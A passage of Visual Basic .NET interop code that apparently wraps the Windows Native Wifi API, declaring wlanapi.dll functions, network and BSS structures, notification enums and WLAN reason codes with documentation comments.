                    Array.Copy(m_dot11PhyTypes, ret, numberOfPhyTypes)
                    Return ret
                End Get
            End Property
            ''' <summary>
            ''' Specifies if there are more than 8 PHY types supported.
            ''' When this member is set to <c>true</c>, an application must call <see cref="WlanClient.WlanInterface.GetNetworkBssList"/> to get the complete list of PHY types.
            ''' <see cref="WlanBssEntry.phyId"/> contains the PHY type for an entry.
            ''' </summary>
            Public morePhyTypes As Boolean
            ''' <summary>
            ''' A percentage value that represents the signal quality of the network.
            ''' This field contains a value between 0 and 100.
            ''' A value of 0 implies an actual RSSI signal strength of -100 dbm.
            ''' A value of 100 implies an actual RSSI signal strength of -50 dbm.
            ''' You can calculate the RSSI signal strength value for values between 1 and 99 using linear interpolation.
            ''' </summary>
            Public wlanSignalQuality As UInteger
            ''' <summary>
            ''' Indicates whether security is enabled on the network.
            ''' </summary>
            Public securityEnabled As Boolean
            ''' <summary>
            ''' Indicates the default authentication algorithm used to join this network for the first time.
            ''' </summary>
            Public dot11DefaultAuthAlgorithm As Dot11AuthAlgorithm
            ''' <summary>
            ''' Indicates the default cipher algorithm to be used when joining this network.
            ''' </summary>
            Public dot11DefaultCipherAlgorithm As Dot11CipherAlgorithm
            ''' <summary>
            ''' Contains various flags for the network.
            ''' </summary>
            Public flags As WlanAvailableNetworkFlags
            ''' <summary>
            ''' Reserved for future use. Must be set to NULL.
            ''' </summary>
            Private reserved As UInteger
        End Structure

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetAvailableNetworkList(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal flags As WlanGetAvailableNetworkFlags, <[In](), Out()> ByVal reservedPtr As IntPtr, <Out()> ByRef availableNetworkListPtr As IntPtr) As Integer
        End Function

        <Flags()> _
        Public Enum WlanProfileFlags
            ''' <remarks>
            ''' The only option available on Windows XP SP2.
            ''' </remarks>
            AllUser = 0
            GroupPolicy = 1
            User = 2
        End Enum

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanSetProfile(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal flags As WlanProfileFlags, <[In](), MarshalAs(UnmanagedType.LPWStr)> ByVal profileXml As String, <[In](), [Optional](), MarshalAs(UnmanagedType.LPWStr)> ByVal allUserProfileSecurity As String, <[In]()> ByVal overwrite As Boolean, _
   <[In]()> ByVal pReserved As IntPtr, <Out()> ByRef reasonCode As WlanReasonCode) As Integer
        End Function

        ''' <summary>
        ''' Defines the access mask of an all-user profile.
        ''' </summary>
        <Flags()> _
        Public Enum WlanAccess
            ''' <summary>
            ''' The user can view profile permissions.
            ''' </summary>
            ReadAccess = &H20000 Or &H1
            ''' <summary>
            ''' The user has read access, and the user can also connect to and disconnect from a network using the profile.
            ''' </summary>
            ExecuteAccess = ReadAccess Or &H20
            ''' <summary>
            ''' The user has execute access and the user can also modify and delete permissions associated with a profile.
            ''' </summary>
            WriteAccess = ReadAccess Or ExecuteAccess Or &H2 Or &H10000 Or &H40000
        End Enum

        ''' <param name="flags">Not supported on Windows XP SP2: must be a <c>null</c> reference.</param>
        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetProfile(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In](), MarshalAs(UnmanagedType.LPWStr)> ByVal profileName As String, <[In]()> ByVal pReserved As IntPtr, <Out()> ByRef profileXml As IntPtr, <Out(), [Optional]()> ByRef flags As WlanProfileFlags, _
   <Out(), [Optional]()> ByRef grantedAccess As WlanAccess) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetProfileList(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal pReserved As IntPtr, <Out()> ByRef profileList As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Sub WlanFreeMemory(ByVal pMemory As IntPtr)
        End Sub

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanReasonCodeToString(<[In]()> ByVal reasonCode As WlanReasonCode, <[In]()> ByVal bufferSize As Integer, <[In](), Out()> ByVal stringBuffer As StringBuilder, ByVal pReserved As IntPtr) As Integer
        End Function

        ''' <summary>
        ''' Specifies where the notification comes from.
        ''' </summary>
        <Flags()> _
        Public Enum WlanNotificationSource
            None = 0
            ''' <summary>
            ''' All notifications, including those generated by the 802.1X module.
            ''' </summary>
            All = &HFFFF
            ''' <summary>
            ''' Notifications generated by the auto configuration module.
            ''' </summary>
            ACM = &H8
            ''' <summary>
            ''' Notifications generated by MSM.
            ''' </summary>
            MSM = &H10
            ''' <summary>
            ''' Notifications generated by the security module.
            ''' </summary>
            Security = &H20
            ''' <summary>
            ''' Notifications generated by independent hardware vendors (IHV).
            ''' </summary>
            IHV = &H40
        End Enum

        ''' <summary>
        ''' Indicates the type of an ACM (<see cref="WlanNotificationSource.ACM"/>) notification.
        ''' </summary>
        ''' <remarks>
        ''' The enumeration identifiers correspond to the native <c>wlan_notification_acm_</c> identifiers.
        ''' On Windows XP SP2, only the <c>ConnectionComplete</c> and <c>Disconnected</c> notifications are available.
        ''' </remarks>
        Public Enum WlanNotificationCodeAcm
            AutoconfEnabled = 1
            AutoconfDisabled
            BackgroundScanEnabled
            BackgroundScanDisabled
            BssTypeChange
            PowerSettingChange
            ScanComplete
            ScanFail
            ConnectionStart
            ConnectionComplete
            ConnectionAttemptFail
            FilterListChange
            InterfaceArrival
            InterfaceRemoval
            ProfileChange
            ProfileNameChange
            ProfilesExhausted
            NetworkNotAvailable
            NetworkAvailable
            Disconnecting
            Disconnected
            AdhocNetworkStateChange
        End Enum

        ''' <summary>
        ''' Indicates the type of an MSM (<see cref="WlanNotificationSource.MSM"/>) notification.
        ''' </summary>
        ''' <remarks>
        ''' The enumeration identifiers correspond to the native <c>wlan_notification_msm_</c> identifiers.
        ''' </remarks>
        Public Enum WlanNotificationCodeMsm
            Associating = 1
            Associated
            Authenticating
            Connected
            RoamingStart
            RoamingEnd
            RadioStateChange
            SignalQualityChange
            Disassociating
            Disconnected
            PeerJoin
            PeerLeave
            AdapterRemoval
            AdapterOperationModeChange
        End Enum

        ''' <summary>
        ''' Contains information provided when registering for notifications.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_NOTIFICATION_DATA</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanNotificationData
            ''' <summary>
            ''' Specifies where the notification comes from.
            ''' </summary>
            ''' <remarks>
            ''' On Windows XP SP2, this field must be set to <see cref="WlanNotificationSource.None"/>, <see cref="WlanNotificationSource.All"/> or <see cref="WlanNotificationSource.ACM"/>.
            ''' </remarks>
            Public notificationSource As WlanNotificationSource
            ''' <summary>
            ''' Indicates the type of notification. The value of this field indicates what type of associated data will be present in <see cref="dataPtr"/>.
            ''' </summary>
            Public m_notificationCode As Integer
            ''' <summary>
            ''' Indicates which interface the notification is for.
            ''' </summary>
            Public interfaceGuid As Guid
            ''' <summary>
            ''' Specifies the size of <see cref="dataPtr"/>, in bytes.
            ''' </summary>
            Public dataSize As Integer
            ''' <summary>
            ''' Pointer to additional data needed for the notification, as indicated by <see cref="notificationCode"/>.
            ''' </summary>
            Public dataPtr As IntPtr

            ''' <summary>
            ''' Gets the notification code (in the correct enumeration type) according to the notification source.
            ''' </summary>
            Public ReadOnly Property NotificationCode() As Object
                Get
                    If notificationSource = WlanNotificationSource.MSM Then
                        Return CType(m_notificationCode, WlanNotificationCodeMsm)
                    ElseIf notificationSource = WlanNotificationSource.ACM Then
                        Return CType(m_notificationCode, WlanNotificationCodeAcm)
                    Else
                        Return m_notificationCode
                    End If
                End Get
            End Property

        End Structure

        ''' <summary>
        ''' Defines the callback function which accepts WLAN notifications.
        ''' </summary>
        Public Delegate Sub WlanNotificationCallbackDelegate(ByRef notificationData As WlanNotificationData, ByVal context As IntPtr)

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanRegisterNotification(<[In]()> ByVal clientHandle As IntPtr, <[In]()> ByVal notifSource As WlanNotificationSource, <[In]()> ByVal ignoreDuplicate As Boolean, <[In]()> ByVal funcCallback As WlanNotificationCallbackDelegate, <[In]()> ByVal callbackContext As IntPtr, <[In]()> ByVal reserved As IntPtr, _
   <Out()> ByRef prevNotifSource As WlanNotificationSource) As Integer
        End Function

        ''' <summary>
        ''' Defines connection parameter flags.
        ''' </summary>
        <Flags()> _
        Public Enum WlanConnectionFlags
            ''' <summary>
            ''' Connect to the destination network even if the destination is a hidden network. A hidden network does not broadcast its SSID. Do not use this flag if the destination network is an ad-hoc network.
            ''' <para>If the profile specified by <see cref="WlanConnectionParameters.profile"/> is not <c>null</c>, then this flag is ignored and the nonBroadcast profile element determines whether to connect to a hidden network.</para>
            ''' </summary>
            HiddenNetwork = &H1
            ''' <summary>
            ''' Do not form an ad-hoc network. Only join an ad-hoc network if the network already exists. Do not use this flag if the destination network is an infrastructure network.
            ''' </summary>
            AdhocJoinOnly = &H2
            ''' <summary>
            ''' Ignore the privacy bit when connecting to the network. Ignoring the privacy bit has the effect of ignoring whether packets are encryption and ignoring the method of encryption used. Only use this flag when connecting to an infrastructure network using a temporary profile.
            ''' </summary>
            IgnorePrivacyBit = &H4
            ''' <summary>
            ''' Exempt EAPOL traffic from encryption and decryption. This flag is used when an application must send EAPOL traffic over an infrastructure network that uses Open authentication and WEP encryption. This flag must not be used to connect to networks that require 802.1X authentication. This flag is only valid when <see cref="WlanConnectionParameters.wlanConnectionMode"/> is set to <see cref="WlanConnectionMode.TemporaryProfile"/>. Avoid using this flag whenever possible.
            ''' </summary>
            EapolPassthrough = &H8
        End Enum

        ''' <summary>
        ''' Specifies the parameters used when using the <see cref="WlanConnect"/> function.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_CONNECTION_PARAMETERS</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanConnectionParameters
            ''' <summary>
            ''' Specifies the mode of connection.
            ''' </summary>
            Public wlanConnectionMode As WlanConnectionMode
            ''' <summary>
            ''' Specifies the profile being used for the connection.
            ''' The contents of the field depend on the <see cref="wlanConnectionMode"/>:
            ''' <list type="table">
            ''' <listheader>
            ''' <term>Value of <see cref="wlanConnectionMode"/></term>
            ''' <description>Contents of the profile string</description>
            ''' </listheader>
            ''' <item>
            ''' <term><see cref="WlanConnectionMode.Profile"/></term>
            ''' <description>The name of the profile used for the connection.</description>
            ''' </item>
            ''' <item>
            ''' <term><see cref="WlanConnectionMode.TemporaryProfile"/></term>
            ''' <description>The XML representation of the profile used for the connection.</description>
            ''' </item>
            ''' <item>
            ''' <term><see cref="WlanConnectionMode.DiscoverySecure"/>, <see cref="WlanConnectionMode.DiscoveryUnsecure"/> or <see cref="WlanConnectionMode.Auto"/></term>
            ''' <description><c>null</c></description>
            ''' </item>
            ''' </list>
            ''' </summary>
            <MarshalAs(UnmanagedType.LPWStr)> _
            Public profile As String
            ''' <summary>
            ''' Pointer to a <see cref="Dot11Ssid"/> structure that specifies the SSID of the network to connect to.
            ''' This field is optional. When set to <c>null</c>, all SSIDs in the profile will be tried.
            ''' This field must not be <c>null</c> if <see cref="wlanConnectionMode"/> is set to <see cref="WlanConnectionMode.DiscoverySecure"/> or <see cref="WlanConnectionMode.DiscoveryUnsecure"/>.
            ''' </summary>
            Public dot11SsidPtr As IntPtr
            ''' <summary>
            ''' Pointer to a <see cref="Dot11BssidList"/> structure that contains the list of basic service set (BSS) identifiers desired for the connection.
            ''' </summary>
            ''' <remarks>
            ''' On Windows XP SP2, must be set to <c>null</c>.
            ''' </remarks>
            Public desiredBssidListPtr As IntPtr
            ''' <summary>
            ''' A <see cref="Dot11BssType"/> value that indicates the BSS type of the network. If a profile is provided, this BSS type must be the same as the one in the profile.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            ''' <summary>
            ''' Specifies ocnnection parameters.
            ''' </summary>
            ''' <remarks>
            ''' On Windows XP SP2, must be set to 0.
            ''' </remarks>
            Public flags As WlanConnectionFlags
        End Structure

        ''' <summary>
        ''' The connection state of an ad hoc network.
        ''' </summary>
        Public Enum WlanAdhocNetworkState
            ''' <summary>
            ''' The ad hoc network has been formed, but no client or host is connected to the network.
            ''' </summary>
            Formed = 0
            ''' <summary>
            ''' A client or host is connected to the ad hoc network.
            ''' </summary>
            Connected = 1
        End Enum

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanConnect(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByRef connectionParameters As WlanConnectionParameters, ByVal pReserved As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanDeleteProfile(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In](), MarshalAs(UnmanagedType.LPWStr)> ByVal profileName As String, ByVal reservedPtr As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetNetworkBssList(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal dot11SsidInt As IntPtr, <[In]()> ByVal dot11BssType As Dot11BssType, <[In]()> ByVal securityEnabled As Boolean, ByVal reservedPtr As IntPtr, _
   <Out()> ByRef wlanBssList As IntPtr) As Integer
        End Function

        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanBssListHeader
            Friend totalSize As UInteger
            Friend numberOfItems As UInteger
        End Structure

        ''' <summary>
        ''' Contains information about a basic service set (BSS).
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanBssEntry
            ''' <summary>
            ''' Contains the SSID of the access point (AP) associated with the BSS.
            ''' </summary>
            Public dot11Ssid As Dot11Ssid
            ''' <summary>
            ''' The identifier of the PHY on which the AP is operating.
            ''' </summary>
            Public phyId As UInteger
            ''' <summary>
            ''' Contains the BSS identifier.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=6)> _
            Public dot11Bssid As Byte()
            ''' <summary>
            ''' Specifies whether the network is infrastructure or ad hoc.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            Public dot11BssPhyType As Dot11PhyType
            ''' <summary>
            ''' The received signal strength in dBm.
            ''' </summary>
            Public rssi As Integer
            ''' <summary>
            ''' The link quality reported by the driver. Ranges from 0-100.
            ''' </summary>
            Public linkQuality As UInteger
            ''' <summary>
            ''' If 802.11d is not implemented, the network interface card (NIC) must set this field to TRUE. If 802.11d is implemented (but not necessarily enabled), the NIC must set this field to TRUE if the BSS operation complies with the configured regulatory domain.
            ''' </summary>
            Public inRegDomain As Boolean
            ''' <summary>
            ''' Contains the beacon interval value from the beacon packet or probe response.
            ''' </summary>
            Public beaconPeriod As UShort
            ''' <summary>
            ''' The timestamp from the beacon packet or probe response.
            ''' </summary>
            Public timestamp As ULong
            ''' <summary>
            ''' The host timestamp value when the beacon or probe response is received.
            ''' </summary>
            Public hostTimestamp As ULong
            ''' <summary>
            ''' The capability value from the beacon packet or probe response.
            ''' </summary>
            Public capabilityInformation As UShort
            ''' <summary>
            ''' The frequency of the center channel, in kHz.
            ''' </summary>
            Public chCenterFrequency As UInteger
            ''' <summary>
            ''' Contains the set of data transfer rates supported by the BSS.
            ''' </summary>
            Public wlanRateSet As WlanRateSet
            ''' <summary>
            ''' Offset of the information element (IE) data blob.
            ''' </summary>
            Public ieOffset As UInteger
            ''' <summary>
            ''' Size of the IE data blob, in bytes.
            ''' </summary>
            Public ieSize As UInteger
        End Structure

        ''' <summary>
        ''' Contains the set of supported data rates.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanRateSet
            ''' <summary>
            ''' The length, in bytes, of <see cref="rateSet"/>.
            ''' </summary>
            Private rateSetLength As UInteger
            ''' <summary>
            ''' An array of supported data transfer rates.
            ''' If the rate is a basic rate, the first bit of the rate value is set to 1.
            ''' A basic rate is the data transfer rate that all stations in a basic service set (BSS) can use to receive frames from the wireless medium.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=126)> _
            Private rateSet As UShort()

            Public ReadOnly Property Rates() As UShort()
                Get
                    Dim rates__1 As UShort() = New UShort(rateSetLength \ 2 - 1) {}
                    Array.Copy(rateSet, rates__1, rates__1.Length)
                    Return rates__1
                End Get
            End Property

            ''' <summary>
            ''' CalculateS the data transfer rate in Mbps for an arbitrary supported rate.
            ''' </summary>
            ''' <param name="rate"></param>
            ''' <returns></returns>
            Public Function GetRateInMbps(ByVal rate As Integer) As Double
                Return (rateSet(rate) And &H7FFF) * 0.5
            End Function
        End Structure

        ''' <summary>
        ''' Represents an error occuring during WLAN operations which indicate their failure via a <see cref="WlanReasonCode"/>.
        ''' </summary>
        Public Class WlanException
            Inherits Exception
            Private m_reasonCode As WlanReasonCode

            Private Sub New(ByVal reasonCode As WlanReasonCode)
                Me.m_reasonCode = reasonCode
            End Sub

            ''' <summary>
            ''' Gets the WLAN reason code.
            ''' </summary>
            ''' <value>The WLAN reason code.</value>
            Public ReadOnly Property ReasonCode() As WlanReasonCode
                Get
                    Return m_reasonCode
                End Get
            End Property

            ''' <summary>
            ''' Gets a message that describes the reason code.
            ''' </summary>
            ''' <value></value>
            ''' <returns>The error message that explains the reason for the exception, or an empty string("").</returns>
            Public Overrides ReadOnly Property Message() As String
                Get
                    Dim sb As New StringBuilder(1024)
                    If WlanReasonCodeToString(m_reasonCode, sb.Capacity, sb, IntPtr.Zero) = 0 Then
                        Return sb.ToString()
                    Else
                        Return String.Empty
                    End If
                End Get
            End Property
        End Class

        ' TODO: .NET-ify the WlanReasonCode enum (naming convention + docs).

        ''' <summary>
        ''' Specifies reasons for a failure of a WLAN operation.
        ''' </summary>
        ''' <remarks>
        ''' To get the WLAN API native reason code identifiers, prefix the identifiers with <c>WLAN_REASON_CODE_</c>.
        ''' </remarks>
        Public Enum WlanReasonCode
            Success = 0
            ' general codes
            UNKNOWN = &H10000 + 1

            RANGE_SIZE = &H10000
            BASE = &H10000 + RANGE_SIZE

            ' range for Auto Config
            '
            AC_BASE = &H10000 + RANGE_SIZE
            AC_CONNECT_BASE = (AC_BASE + RANGE_SIZE / 2)
            AC_END = (AC_BASE + RANGE_SIZE - 1)

            ' range for profile manager
            ' it has profile adding failure reason codes, but may not have 
            ' connection reason codes
            '
            PROFILE_BASE = &H10000 + (7 * RANGE_SIZE)
            PROFILE_CONNECT_BASE = (PROFILE_BASE + RANGE_SIZE / 2)
            PROFILE_END = (PROFILE_BASE + RANGE_SIZE - 1)

            ' range for MSM
            '
            MSM_BASE = &H10000 + (2 * RANGE_SIZE)
            MSM_CONNECT_BASE = (MSM_BASE + RANGE_SIZE / 2)
            MSM_END = (MSM_BASE + RANGE_SIZE - 1)

            ' range for MSMSEC
            '
            MSMSEC_BASE = &H10000 + (3 * RANGE_SIZE)
            MSMSEC_CONNECT_BASE = (MSMSEC_BASE + RANGE_SIZE / 2)
            MSMSEC_END = (MSMSEC_BASE + RANGE_SIZE - 1)

            ' AC network incompatible reason codes
            '
            NETWORK_NOT_COMPATIBLE = (AC_BASE + 1)
            PROFILE_NOT_COMPATIBLE = (AC_BASE + 2)

            ' AC connect reason code
            '
            NO_AUTO_CONNECTION = (AC_CONNECT_BASE + 1)
            NOT_VISIBLE = (AC_CONNECT_BASE + 2)
            GP_DENIED = (AC_CONNECT_BASE + 3)
            USER_DENIED = (AC_CONNECT_BASE + 4)
            BSS_TYPE_NOT_ALLOWED = (AC_CONNECT_BASE + 5)
            IN_FAILED_LIST = (AC_CONNECT_BASE + 6)
            IN_BLOCKED_LIST = (AC_CONNECT_BASE + 7)
            SSID_LIST_TOO_LONG = (AC_CONNECT_BASE + 8)
            CONNECT_CALL_FAIL = (AC_CONNECT_BASE + 9)
            SCAN_CALL_FAIL = (AC_CONNECT_BASE + 10)
            NETWORK_NOT_AVAILABLE = (AC_CONNECT_BASE + 11)
            PROFILE_CHANGED_OR_DELETED = (AC_CONNECT_BASE + 12)
            KEY_MISMATCH = (AC_CONNECT_BASE + 13)
            USER_NOT_RESPOND = (AC_CONNECT_BASE + 14)

            ' Profile validation errors
            '
            INVALID_PROFILE_SCHEMA = (PROFILE_BASE + 1)
            PROFILE_MISSING = (PROFILE_BASE + 2)
            INVALID_PROFILE_NAME = (PROFILE_BASE + 3)
            INVALID_PROFILE_TYPE = (PROFILE_BASE + 4)
            INVALID_PHY_TYPE = (PROFILE_BASE + 5)
            MSM_SECURITY_MISSING = (PROFILE_BASE + 6)
            IHV_SECURITY_NOT_SUPPORTED = (PROFILE_BASE + 7)
            IHV_OUI_MISMATCH = (PROFILE_BASE + 8)
            ' IHV OUI not present but there is IHV settings in profile
            IHV_OUI_MISSING = (PROFILE_BASE + 9)
            ' IHV OUI is present but there is no IHV settings in profile
            IHV_SETTINGS_MISSING = (PROFILE_BASE + 10)
            ' both/conflict MSMSec and IHV security settings exist in profile 
            CONFLICT_SECURITY = (PROFILE_BASE + 11)
            ' no IHV or MSMSec security settings in profile
            SECURITY_MISSING = (PROFILE_BASE + 12)
            INVALID_BSS_TYPE = (PROFILE_BASE + 13)
            INVALID_ADHOC_CONNECTION_MODE = (PROFILE_BASE + 14)
            NON_BROADCAST_SET_FOR_ADHOC = (PROFILE_BASE + 15)
            AUTO_SWITCH_SET_FOR_ADHOC = (PROFILE_BASE + 16)
            AUTO_SWITCH_SET_FOR_MANUAL_CONNECTION = (PROFILE_BASE + 17)
            IHV_SECURITY_ONEX_MISSING = (PROFILE_BASE + 18)
            PROFILE_SSID_INVALID = (PROFILE_BASE + 19)
            TOO_MANY_SSID = (PROFILE_BASE + 20)

            ' MSM network incompatible reasons
            '
            UNSUPPORTED_SECURITY_SET_BY_OS = (MSM_BASE + 1)
            UNSUPPORTED_SECURITY_SET = (MSM_BASE + 2)
            BSS_TYPE_UNMATCH = (MSM_BASE + 3)
            PHY_TYPE_UNMATCH = (MSM_BASE + 4)
            DATARATE_UNMATCH = (MSM_BASE + 5)

            ' MSM connection failure reasons, to be defined
            ' failure reason codes
            '
            ' user called to disconnect
            USER_CANCELLED = (MSM_CONNECT_BASE + 1)
            ' got disconnect while associating
            ASSOCIATION_FAILURE = (MSM_CONNECT_BASE + 2)
            ' timeout for association
            ASSOCIATION_TIMEOUT = (MSM_CONNECT_BASE + 3)
            ' pre-association security completed with failure
            PRE_SECURITY_FAILURE = (MSM_CONNECT_BASE + 4)
            ' fail to start post-association security
            START_SECURITY_FAILURE = (MSM_CONNECT_BASE + 5)
            ' post-association security completed with failure
            SECURITY_FAILURE = (MSM_CONNECT_BASE + 6)
            ' security watchdog timeout
            SECURITY_TIMEOUT = (MSM_CONNECT_BASE + 7)
            ' got disconnect from driver when roaming
            ROAMING_FAILURE = (MSM_CONNECT_BASE + 8)
            ' failed to start security for roaming
            ROAMING_SECURITY_FAILURE = (MSM_CONNECT_BASE + 9)
            ' failed to start security for adhoc-join
            ADHOC_SECURITY_FAILURE = (MSM_CONNECT_BASE + 10)
            ' got disconnection from driver
            DRIVER_DISCONNECTED = (MSM_CONNECT_BASE + 11)
            ' driver operation failed
            DRIVER_OPERATION_FAILURE = (MSM_CONNECT_BASE + 12)
            ' Ihv service is not available
            IHV_NOT_AVAILABLE = (MSM_CONNECT_BASE + 13)
            ' Response from ihv timed out
            IHV_NOT_RESPONDING = (MSM_CONNECT_BASE + 14)
            ' Timed out waiting for driver to disconnect
            DISCONNECT_TIMEOUT = (MSM_CONNECT_BASE + 15)
            ' An internal error prevented the operation from being completed.
            INTERNAL_FAILURE = (MSM_CONNECT_BASE + 16)
            ' UI Request timed out.
            UI_REQUEST_TIMEOUT = (MSM_CONNECT_BASE + 17)
            ' Roaming too often, post security is not completed after 5 times.
            TOO_MANY_SECURITY_ATTEMPTS = (MSM_CONNECT_BASE + 18)

            ' MSMSEC reason codes
            '

            MSMSEC_MIN = MSMSEC_BASE

            ' Key index specified is not valid
            MSMSEC_PROFILE_INVALID_KEY_INDEX = (MSMSEC_BASE + 1)
            ' Key required, PSK present
            MSMSEC_PROFILE_PSK_PRESENT = (MSMSEC_BASE + 2)
            ' Invalid key length
            MSMSEC_PROFILE_KEY_LENGTH = (MSMSEC_BASE + 3)
            ' Invalid PSK length
            MSMSEC_PROFILE_PSK_LENGTH = (MSMSEC_BASE + 4)
            ' No auth/cipher specified
            MSMSEC_PROFILE_NO_AUTH_CIPHER_SPECIFIED = (MSMSEC_BASE + 5)
            ' Too many auth/cipher specified
            MSMSEC_PROFILE_TOO_MANY_AUTH_CIPHER_SPECIFIED = (MSMSEC_BASE + 6)
            ' Profile contains duplicate auth/cipher
            MSMSEC_PROFILE_DUPLICATE_AUTH_CIPHER = (MSMSEC_BASE + 7)
            ' Profile raw data is invalid (1x or key data)
            MSMSEC_PROFILE_RAWDATA_INVALID = (MSMSEC_BASE + 8)
            ' Invalid auth/cipher combination
            MSMSEC_PROFILE_INVALID_AUTH_CIPHER = (MSMSEC_BASE + 9)
            ' 802.1x disabled when it's required to be enabled
            MSMSEC_PROFILE_ONEX_DISABLED = (MSMSEC_BASE + 10)
            ' 802.1x enabled when it's required to be disabled
            MSMSEC_PROFILE_ONEX_ENABLED = (MSMSEC_BASE + 11)
            MSMSEC_PROFILE_INVALID_PMKCACHE_MODE = (MSMSEC_BASE + 12)
            MSMSEC_PROFILE_INVALID_PMKCACHE_SIZE = (MSMSEC_BASE + 13)
            MSMSEC_PROFILE_INVALID_PMKCACHE_TTL = (MSMSEC_BASE + 14)
            MSMSEC_PROFILE_INVALID_PREAUTH_MODE = (MSMSEC_BASE + 15)
            MSMSEC_PROFILE_INVALID_PREAUTH_THROTTLE = (MSMSEC_BASE + 16)
            ' PreAuth enabled when PMK cache is disabled
            MSMSEC_PROFILE_PREAUTH_ONLY_ENABLED = (MSMSEC_BASE + 17)
            ' Capability matching failed at network
            MSMSEC_CAPABILITY_NETWORK = (MSMSEC_BASE + 18)
            ' Capability matching failed at NIC
            MSMSEC_CAPABILITY_NIC = (MSMSEC_BASE + 19)
            ' Capability matching failed at profile
            MSMSEC_CAPABILITY_PROFILE = (MSMSEC_BASE + 20)
            ' Network does not support specified discovery type
            MSMSEC_CAPABILITY_DISCOVERY = (MSMSEC_BASE + 21)
            ' Passphrase contains invalid character
            MSMSEC_PROFILE_PASSPHRASE_CHAR = (MSMSEC_BASE + 22)
            ' Key material contains invalid character
            MSMSEC_PROFILE_KEYMATERIAL_CHAR = (MSMSEC_BASE + 23)
            ' Wrong key type specified for the auth/cipher pair
            MSMSEC_PROFILE_WRONG_KEYTYPE = (MSMSEC_BASE + 24)
            ' "Mixed cell" suspected (AP not beaconing privacy, we have privacy enabled profile)
            MSMSEC_MIXED_CELL = (MSMSEC_BASE + 25)
            ' Auth timers or number of timeouts in profile is incorrect
            MSMSEC_PROFILE_AUTH_TIMERS_INVALID = (MSMSEC_BASE + 26)
            ' Group key update interval in profile is incorrect
            MSMSEC_PROFILE_INVALID_GKEY_INTV = (MSMSEC_BASE + 27)
            ' "Transition network" suspected, trying legacy 802.11 security
            MSMSEC_TRANSITION_NETWORK = (MSMSEC_BASE + 28)
            ' Key contains characters which do not map to ASCII
            MSMSEC_PROFILE_KEY_UNMAPPED_CHAR = (MSMSEC_BASE + 29)
            ' Capability matching failed at profile (auth not found)
            MSMSEC_CAPABILITY_PROFILE_AUTH = (MSMSEC_BASE + 30)
            ' Capability matching failed at profile (cipher not found)
            MSMSEC_CAPABILITY_PROFILE_CIPHER = (MSMSEC_BASE + 31)

            ' Failed to queue UI request
            MSMSEC_UI_REQUEST_FAILURE = (MSMSEC_CONNECT_BASE + 1)
            ' 802.1x authentication did not start within configured time 
            MSMSEC_AUTH_START_TIMEOUT = (MSMSEC_CONNECT_BASE + 2)
            ' 802.1x authentication did not complete within configured time
            MSMSEC_AUTH_SUCCESS_TIMEOUT = (MSMSEC_CONNECT_BASE + 3)
            ' Dynamic key exchange did not start within configured time
            MSMSEC_KEY_START_TIMEOUT = (MSMSEC_CONNECT_BASE + 4)
            ' Dynamic key exchange did not succeed within configured time
            MSMSEC_KEY_SUCCESS_TIMEOUT = (MSMSEC_CONNECT_BASE + 5)
            ' Message 3 of 4 way handshake has no key data (RSN/WPA)
            MSMSEC_M3_MISSING_KEY_DATA = (MSMSEC_CONNECT_BASE + 6)
            ' Message 3 of 4 way handshake has no IE (RSN/WPA)
            MSMSEC_M3_MISSING_IE = (MSMSEC_CONNECT_BASE + 7)
            ' Message 3 of 4 way handshake has no Group Key (RSN)
            MSMSEC_M3_MISSING_GRP_KEY = (MSMSEC_CONNECT_BASE + 8)
            ' Matching security capabilities of IE in M3 failed (RSN/WPA)
            MSMSEC_PR_IE_MATCHING = (MSMSEC_CONNECT_BASE + 9)
            ' Matching security capabilities of Secondary IE in M3 failed (RSN)
            MSMSEC_SEC_IE_MATCHING = (MSMSEC_CONNECT_BASE + 10)
            ' Required a pairwise key but AP configured only group keys
            MSMSEC_NO_PAIRWISE_KEY = (MSMSEC_CONNECT_BASE + 11)
            ' Message 1 of group key handshake has no key data (RSN/WPA)
            MSMSEC_G1_MISSING_KEY_DATA = (MSMSEC_CONNECT_BASE + 12)
            ' Message 1 of group key handshake has no group key
            MSMSEC_G1_MISSING_GRP_KEY = (MSMSEC_CONNECT_BASE + 13)
            ' AP reset secure bit after connection was secured
